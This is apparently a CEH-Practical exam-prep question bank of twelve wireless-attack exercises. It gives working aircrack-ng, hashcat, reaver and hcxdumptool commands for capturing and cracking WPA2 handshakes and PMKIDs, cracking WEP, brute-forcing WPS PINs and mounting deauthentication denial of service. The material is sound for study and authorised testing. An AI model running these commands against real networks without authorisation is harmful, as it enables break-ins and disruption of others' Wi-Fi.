# Question Bank — Wireless (12 questions)

> Realistic CEH-Practical-style questions. Steps link into the aircrack-ng suite docs — click any flag to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Put wireless interface `wlan0` into monitor mode

**Category:** Setup | **Tools:** [airmon-ng](../../tools/airmon-ng.md)

**Steps:**
1. Kill interfering processes: `sudo airmon-ng check kill` ← [why check kill](../../tools/airmon-ng.md#check-kill)
2. `sudo airmon-ng start wlan0`
3. Confirm new iface: `iwconfig` — should show `wlan0mon` in `Mode:Monitor`.

**Answer format:** the monitor interface name (e.g. `wlan0mon`)

**Gotcha:** if `check kill` doesn't fix it, manually kill `NetworkManager` and `wpa_supplicant`. Some Realtek drivers rename the iface.

---

### Q2 🟢 — List all nearby access points

**Category:** AP discovery | **Tools:** [airodump-ng](../../tools/airodump-ng.md)

**Steps:**
1. `sudo airodump-ng wlan0mon` ← [why airodump](../../tools/airodump-ng.md#live-discovery)
2. Let it run ~30 seconds so all channels hop.
3. Note columns: `BSSID`, `CH`, `ENC`, `ESSID`, `PWR`.

**Answer format:** count of APs or a specific ESSID as asked

**Gotcha:** by default airodump hops 2.4 GHz only. Add `--band a` for 5 GHz or `--band abg` for both.

---

### Q3 🟢 — Find the ESSID for BSSID `AA:BB:CC:DD:EE:FF`

**Category:** AP lookup | **Tools:** [airodump-ng](../../tools/airodump-ng.md)

**Steps:**
1. `sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon` ← [why --bssid](../../tools/airodump-ng.md#filters)
2. Read the `ESSID` column of the single-row header.

**Answer format:** ESSID string

**Gotcha:** if ESSID shows `<length: 8>`, it's a hidden SSID — see Q8.

---

### Q4 🟡 — List all clients connected to AP `CorpWiFi` on channel 6

**Category:** Client enum | **Tools:** [airodump-ng](../../tools/airodump-ng.md)

**Steps:**
1. `sudo airodump-ng -c 6 --essid CorpWiFi wlan0mon` ← [why -c](../../tools/airodump-ng.md#channel-lock)
2. Lower table `STATION` column lists MAC addresses of associated clients.
3. Count unique `STATION` entries where `BSSID` matches CorpWiFi's.

**Answer format:** integer or list of MACs

**Gotcha:** lock the channel (`-c`) — without it, airodump hops channels and misses frames.

---

### Q5 🟡 — Capture a WPA2 handshake for `CorpWiFi` (BSSID `AA:BB:..`, ch 6)

**Category:** Handshake capture | **Tools:** [airodump-ng](../../tools/airodump-ng.md), [aireplay-ng](../../tools/aireplay-ng.md)

**Steps:**
1. Start capture to file:
   ```
   sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
   ```
   ← [why -w](../../tools/airodump-ng.md#capture-to-file)
2. In a second terminal, deauth a connected client to force reconnection:
   ```
   sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c <CLIENT_MAC> wlan0mon
   ```
   ← [why --deauth](../../tools/aireplay-ng.md#deauth)
3. Watch airodump header for `WPA handshake: AA:BB:CC:DD:EE:FF`.

**Answer format:** path to the `.cap` file

**Gotcha:** broadcast deauth (`-c` omitted) is noisy and sometimes ignored by clients — targeted works better.

---

### Q6 🟡 — Crack the captured WPA2 handshake with aircrack-ng

**Category:** Offline crack | **Tools:** [aircrack-ng](../../tools/aircrack-ng.md)

**Steps:**
1. `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap` ← [why -b](../../tools/aircrack-ng.md#wpa-crack)
2. Wait for `KEY FOUND! [ password ]`.

**Answer format:** cleartext PSK

**Gotcha:** must contain the 4-way handshake — if aircrack says "No valid WPA handshakes found", recapture (Q5).

---

### Q7 🔴 — Crack the same handshake faster with hashcat (mode 22000)

**Category:** GPU crack | **Tools:** [hashcat](../../tools/hashcat.md), `hcxpcapngtool`

**Steps:**
1. Convert `.cap` → `.hc22000`:
   ```
   hcxpcapngtool -o corp.hc22000 handshake-01.cap
   ```
2. `hashcat -m 22000 -a 0 corp.hc22000 /usr/share/wordlists/rockyou.txt` ← [why -m 22000](../../tools/hashcat.md#common-modes)
3. `hashcat -m 22000 corp.hc22000 --show`

**Answer format:** cleartext PSK

**Gotcha:** mode `2500` is legacy `.hccapx` — use `22000` for modern PMKID+EAPOL. `hcxdumptool` can also capture PMKID without a client.

---

### Q8 🟡 — Reveal a hidden SSID broadcasting on channel 11

**Category:** Hidden SSID | **Tools:** [airodump-ng](../../tools/airodump-ng.md), [aireplay-ng](../../tools/aireplay-ng.md)

**Steps:**
1. Spot hidden AP: `sudo airodump-ng -c 11 wlan0mon` — look for `ESSID: <length: N>`.
2. Deauth a client to force it to re-associate (the probe request reveals the ESSID):
   ```
   sudo aireplay-ng --deauth 5 -a <HIDDEN_BSSID> -c <CLIENT_MAC> wlan0mon
   ```
3. Watch airodump — ESSID column will fill in on re-association.

**Answer format:** the revealed ESSID

**Gotcha:** no clients = no reveal via deauth. Passive wait for a new association or capture probe requests with `--essid-regex .` .

---

### Q9 🟡 — Crack a WEP network via ARP replay

**Category:** WEP | **Tools:** [airodump-ng](../../tools/airodump-ng.md), [aireplay-ng](../../tools/aireplay-ng.md), [aircrack-ng](../../tools/aircrack-ng.md)

**Steps:**
1. Capture IVs:
   ```
   sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon
   ```
2. Fake auth: `sudo aireplay-ng -1 0 -a <BSSID> wlan0mon` ← [why -1](../../tools/aireplay-ng.md#fake-auth)
3. ARP replay to generate traffic:
   ```
   sudo aireplay-ng -3 -b <BSSID> wlan0mon
   ```
   ← [why -3](../../tools/aireplay-ng.md#arp-replay)
4. Wait for #Data to exceed ~20,000 IVs.
5. `aircrack-ng wep-01.cap` — WEP cracks in seconds.

**Answer format:** WEP key (hex, e.g. `11:22:33:44:55`)

**Gotcha:** WEP is dead but still appears on CEH. PTW attack (default) needs ~20k IVs; KoreK needs ~250k.

---

### Q10 🔴 — Recover a WPS PIN with reaver on `AA:BB:CC:DD:EE:FF`

**Category:** WPS attack | **Tools:** [wash](../../tools/wash.md), [reaver](../../tools/reaver.md)

**Steps:**
1. Find WPS-enabled APs: `sudo wash -i wlan0mon` ← [why wash](../../tools/wash.md#wps-scan)
2. Attack:
   ```
   sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
   ```
   ← [why -vv](../../tools/reaver.md#verbosity)
3. On success it prints `WPS PIN:` and `WPA PSK:`.

**Answer format:** 8-digit PIN + PSK

**Gotcha:** many APs lock WPS after N failures — use `--no-nacks` and `-d 15` to slow down. Pixie-dust attack (`reaver -K 1` or `bully`) is often faster.

---

### Q11 🔴 — Capture a PMKID (clientless) for `TargetAP`

**Category:** Clientless WPA attack | **Tools:** `hcxdumptool`, [hashcat](../../tools/hashcat.md)

**Steps:**
1. `sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`
2. Wait for `[FOUND PMKID]` line.
3. Convert: `hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng`
4. Crack: `hashcat -m 22000 pmkid.hc22000 rockyou.txt`

**Answer format:** cleartext PSK

**Gotcha:** not all APs leak PMKID — those that don't still need a handshake capture (Q5). Mode is still `22000`, not legacy `16800`.

---

### Q12 🔴 — Deauth all clients from `CorpWiFi` (denial of service, authorized only)

**Category:** Availability attack | **Tools:** [aireplay-ng](../../tools/aireplay-ng.md), [airodump-ng](../../tools/airodump-ng.md)

**Steps:**
1. Lock channel in airodump: `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon`
2. Broadcast deauth (continuous):
   ```
   sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
   ```
   ← `0` = unlimited
3. Confirm clients drop in airodump STATION list.

**Answer format:** screenshot / number of deauth frames sent

**Gotcha:** 802.11w (PMF) defeats deauth — if unprotected mgmt frames are disabled, target supports 802.11w. Only valid against pre-WPA3 deployments.

---

## 📌 Quick links

- [airmon-ng](../../tools/airmon-ng.md) · [airodump-ng](../../tools/airodump-ng.md) · [aireplay-ng](../../tools/aireplay-ng.md) · [aircrack-ng](../../tools/aircrack-ng.md)
- [hashcat](../../tools/hashcat.md) · [reaver](../../tools/reaver.md) · [wash](../../tools/wash.md)
- [Wireless attack playbook](../../playbooks/wireless-playbook.md)
- [14-wireless README](../../14-wireless/README.md)
